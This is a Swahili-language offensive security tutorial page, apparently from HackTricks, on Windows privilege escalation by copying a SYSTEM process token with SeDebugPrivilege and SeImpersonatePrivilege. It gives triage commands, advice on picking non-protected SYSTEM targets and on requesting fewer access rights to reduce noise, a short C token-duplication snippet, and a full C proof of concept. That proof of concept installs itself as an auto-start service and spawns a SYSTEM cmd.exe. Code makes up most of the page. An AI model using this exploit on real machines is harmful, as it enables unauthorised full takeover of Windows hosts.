# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unaeleza variant ya **manual token-theft**, ambapo context ya **High Integrity** ambayo tayari ina **`SeDebugPrivilege`** na **`SeImpersonatePrivilege`** hufungua process inayofaa ya **SYSTEM**, **hu-duplicate token** yake, na **hu-spawn process mpya** kwa kutumia token hiyo.

Ikiwa unahitaji tu shell ya haraka ya `SYSTEM` kutoka kwenye privileged admin process, pia angalia:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Ikiwa huna process-handle path lakini una **`SeImpersonatePrivilege`**, njia ya **named-pipe / Potato** kwa kawaida huwa rahisi zaidi:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Triage ya haraka

Kabla ya kujaribu njia ya token-copy, thibitisha kwamba process ya sasa tayari iko kwenye context inayofaa:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** ndiyo inayokuruhusu kufungua michakato mingi ya SYSTEM ambayo **haijalindwa**, hata wakati DACL yake kwa kawaida inakuzuia.
- **`SeImpersonatePrivilege`** ndiyo inayofanya **`CreateProcessWithTokenW`** iwe ya vitendo baadaye.
- Ikiwa njia ya token-copy inakupa tu SYSTEM token dhaifu au iliyochujwa, iba kutoka kwa **mchakato tofauti wa SYSTEM**.

## Chagua mchakato lengwa kwa uangalifu

Mbinu hii kwa kawaida huonyeshwa dhidi ya **`lsass.exe`**, lakini kwenye Windows za kisasa mara nyingi huo huwa **mlengwa usio sahihi**:

- Ikiwa **LSA Protection / RunAsPPL** imewezeshwa, **`lsass.exe`** huwa imelindwa, na mchakato wa kawaida wa admin wenye `SeDebugPrivilege` bado hautaweza kuufungua.<sup>[[2]](#references)</sup>
- Pendelea michakato ya SYSTEM ambayo si ya PPL, kama vile **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, au instance ya mwanzo ya **`svchost.exe`**.
- **Michakato iliyolindwa** na baadhi ya michakato maalum kama **`System`** au **`csrss.exe`** si walengwa halisi wa user-mode kwa mbinu hii.
- Tumia **Process Hacker / Process Explorer** ikiendeshwa ikiwa elevated ili kuthibitisha kama target token ina privileges unazohitaji kabla ya ku-copy.

## Maelezo ya API muhimu kwa vitendo

PoCs nyingi za umma huomba **`PROCESS_ALL_ACCESS`** na **`TOKEN_ALL_ACCESS`**, lakini hiyo huacha kelele zaidi kuliko inavyohitajika. Kwa vitendo:

- Fungua mchakato lengwa kwa rights unazohitaji tu (kwa kawaida **`PROCESS_QUERY_INFORMATION`** au **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Fungua token kwa rights zinazohitajika kuunda mchakato: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Tumia **`DuplicateTokenEx(..., TokenPrimary, ...)`** kuunda **primary token**; impersonation token pekee haitoshi kuunda mchakato mpya.
- Ikiwa **`CreateProcessWithTokenW`** itashindwa kwa **`1314`**, badili utumie **`CreateProcessAsUserW`**.
- Ukianzisha kutoka kwa **service / Session 0**, kumbuka kuwa **`CreateProcessWithTokenW`** humweka child katika **session ya caller**. Ikiwa unahitaji visible desktop shell, tumia **`CreateProcessAsUserW`** na uhamishe token kwenye session unayotaka.<sup>[[1]](#references)</sup>

Mtiririko mdogo wa kisasa unaonekana hivi:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## PoC ya huduma kamili

Msimbo ufuatao **hutumia vibaya privileges `SeDebugPrivilege` na `SeImpersonatePrivilege`** ili kunakili token kutoka kwa **process inayoendeshwa kama SYSTEM** na yenye **privileges zote za token**. Katika hali hii, msimbo unaweza ku-compile na kutumiwa kama **Windows service binary** ili kuthibitisha kuwa primitive hii inafanya kazi.<sup>[[3]](#references)</sup>

Sehemu kuu ya **msimbo ambapo elevation hutokea** iko ndani ya function **`Exploit`**. Ndani ya function hiyo unaweza kuona kwamba **`lsass.exe`** inatafutwa, **token yake inanakiliwa**, na hatimaye token hiyo inatumika kuanzisha **`cmd.exe`** mpya yenye privileges zote za token iliyonakiliwa.

Kwenye hosts za kisasa, mara nyingi utataka kubadilisha **`lsass.exe`** na **process nyingine ya SYSTEM isiyo ya PPL**, kama vile **`winlogon.exe`**, **`wininit.exe`**, au **`services.exe`**.

Process nyingine zinazoendeshwa kama SYSTEM zikiwa na privileges zote au nyingi za token ni: **`services.exe`**, **`svchost.exe`** (baadhi ya za mwanzo), **`wininit.exe`**, **`csrss.exe`**... Kumbuka kwamba kwa ujumla **hutaweza kunakili token kutoka kwa process iliyolindwa**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Marejeo

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Running my program as a service (cboard.cprogramming.com) – Windows service skeleton used by the PoC](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
